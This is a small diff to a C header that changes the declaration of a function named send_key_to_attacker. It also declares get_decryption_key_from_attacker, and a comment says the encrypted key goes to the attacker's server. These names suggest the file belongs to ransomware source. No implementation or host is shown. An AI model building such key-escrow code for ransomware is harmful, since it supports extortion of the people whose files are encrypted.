@@ -5,7 +5,7 @@ extern "C" {
 #endif
 
 // send encrypted key to attacker's server
-int send_key_to_attacker(const char *key_file);
+int send_key_to_attacker(void);
 
 int get_decryption_key_from_attacker(void);
 
